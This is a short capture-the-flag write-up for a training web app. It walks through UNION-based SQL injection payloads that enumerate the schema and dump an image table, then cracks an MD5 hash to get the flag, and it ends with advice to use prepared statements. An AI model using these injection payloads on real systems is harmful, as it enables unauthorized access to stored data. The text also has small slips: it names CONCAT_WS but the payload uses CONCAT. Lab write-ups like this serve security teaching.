## Exploit
On the image search page `${URL}?page=imgsearch` we don't get error messages for the SQL queries this time, it's a blind injection, let's try using the same steps than with the member page SQL injection

First let's get the number of rows. The UNION statement allows us to execute additional queries and to append them to the original one.
```SQL
1=1 UNION SELECT NULL           # nothing
1=1 UNION SELECT NULL,NULL      # works
1=1 UNION SELECT NULL,NULL,NULL # nothing
```
We can conclude that we have access to two columns of output, let's try getting the table and column names from the [mySQL schema](https://dev.mysql.com/doc/mysql-infoschema-excerpt/5.6/en/information-schema-columns-table.html)

```SQL
1=1 UNION SELECT table_name, column_name FROM information_schema.columns
```
We can see the columns of the `list_images` table, namely `id` `url` `title` and `comment`

MySQL uses the `CONCAT_WS` function to concacenate multiple strings with a separator
```SQL
1=1 UNION SELECT NULL, CONCAT(id,url,title,comment) FROM list_images
```

One of the results is the interesting `Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`, decrypted it reads `albatroz`
```shell
$ echo -n albatroz | sha256sum
[REDACTED] -
```

## Fix
To defend against SQL injections developers should use prepared statements with parameterized queries, this will prevent any chance of injections occuring.
A less effective method that should be avoided is to escape the user supplied input, this method is heavily dependent on the database implementation and error-prone, it can make for a secondary defense however.
